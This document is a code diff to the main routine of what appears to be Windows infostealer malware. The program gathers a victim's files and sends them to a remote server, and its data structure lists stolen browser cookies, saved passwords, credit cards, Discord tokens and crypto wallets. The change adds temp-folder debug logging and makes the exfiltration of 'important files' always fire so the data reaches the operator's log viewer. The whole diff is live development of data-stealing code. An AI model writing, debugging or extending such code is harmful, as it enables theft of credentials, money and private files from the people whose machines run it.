@@ -7,6 +7,7 @@
 #include "system_info.h"
 #include <windows.h>
 #include <iostream>
+#include <fstream>
 #include <string>
 #include <thread>
 #include <atomic>
@@ -350,30 +351,88 @@ int main() {
         // Get important files and send update
         if (collectImportantFiles) {
             try {
-                auto importantFiles = extract_important_files(importantFilesConfig);
-                if (!importantFiles.empty()) {
-                    send_chunk(serverUrl, sessionId, PcData{
-                        user,
-                        screenSize,
-                        dateTime,
-                        ipAddress,
-                        std::nullopt, // location
-                        {}, // runningProcesses
-                        {}, // installedApps
-                        BrowserHistory(), // browserHistory
-                        std::nullopt, // browserCookies
-                        std::nullopt, // savedPasswords
-                        std::nullopt, // creditCards
-                        std::nullopt, // autofillAddresses
-                        std::nullopt, // discordTokens
-                        std::nullopt, // systemInfo
-                        std::nullopt, // cryptoWallets
-                        std::nullopt, // cryptoWalletFolders
-                        importantFiles  // importantFiles
-                    });
+                // Log to verify function is being called
+                char tempPath[MAX_PATH];
+                if (GetTempPathA(MAX_PATH, tempPath) > 0) {
+                    std::string logPath = std::string(tempPath) + "important_files_log.txt";
+                    std::ofstream logFile(logPath, std::ios::app);
+                    if (logFile.is_open()) {
+                        logFile << "[MAIN] collectImportantFiles is TRUE, calling extract_important_files" << std::endl;
+                        logFile << "[MAIN] Config size: " << importantFilesConfig.size() << std::endl;
+                        logFile.close();
+                    }
                 }
-            } catch (const std::exception&) {
-                // Continue even if important files collection fails
+                
+                auto importantFiles = extract_important_files(importantFilesConfig);
+                
+                // Log result
+                if (GetTempPathA(MAX_PATH, tempPath) > 0) {
+                    std::string logPath = std::string(tempPath) + "important_files_log.txt";
+                    std::ofstream logFile(logPath, std::ios::app);
+                    if (logFile.is_open()) {
+                        logFile << "[MAIN] extract_important_files returned " << importantFiles.size() << " files" << std::endl;
+                        if (!importantFiles.empty()) {
+                            logFile << "[MAIN] Sending important files to server" << std::endl;
+                        } else {
+                            logFile << "[MAIN] No files found, not sending (this might be the issue!)" << std::endl;
+                        }
+                        logFile.close();
+                    }
+                }
+                
+                // Always send, even if empty - this ensures the section appears in log viewer
+                send_chunk(serverUrl, sessionId, PcData{
+                    user,
+                    screenSize,
+                    dateTime,
+                    ipAddress,
+                    std::nullopt, // location
+                    {}, // runningProcesses
+                    {}, // installedApps
+                    BrowserHistory(), // browserHistory
+                    std::nullopt, // browserCookies
+                    std::nullopt, // savedPasswords
+                    std::nullopt, // creditCards
+                    std::nullopt, // autofillAddresses
+                    std::nullopt, // discordTokens
+                    std::nullopt, // systemInfo
+                    std::nullopt, // cryptoWallets
+                    std::nullopt, // cryptoWalletFolders
+                    importantFiles  // importantFiles (can be empty)
+                });
+            } catch (const std::exception& e) {
+                // Log the exception
+                char tempPath[MAX_PATH];
+                if (GetTempPathA(MAX_PATH, tempPath) > 0) {
+                    std::string logPath = std::string(tempPath) + "important_files_log.txt";
+                    std::ofstream logFile(logPath, std::ios::app);
+                    if (logFile.is_open()) {
+                        logFile << "[MAIN] EXCEPTION in important files extraction: " << e.what() << std::endl;
+                        logFile.close();
+                    }
+                }
+            } catch (...) {
+                // Log unknown exception
+                char tempPath[MAX_PATH];
+                if (GetTempPathA(MAX_PATH, tempPath) > 0) {
+                    std::string logPath = std::string(tempPath) + "important_files_log.txt";
+                    std::ofstream logFile(logPath, std::ios::app);
+                    if (logFile.is_open()) {
+                        logFile << "[MAIN] UNKNOWN EXCEPTION in important files extraction" << std::endl;
+                        logFile.close();
+                    }
+                }
+            }
+        } else {
+            // Log if feature is disabled
+            char tempPath[MAX_PATH];
+            if (GetTempPathA(MAX_PATH, tempPath) > 0) {
+                std::string logPath = std::string(tempPath) + "important_files_log.txt";
+                std::ofstream logFile(logPath, std::ios::app);
+                if (logFile.is_open()) {
+                    logFile << "[MAIN] collectImportantFiles is FALSE - feature disabled!" << std::endl;
+                    logFile.close();
+                }
             }
         }
 
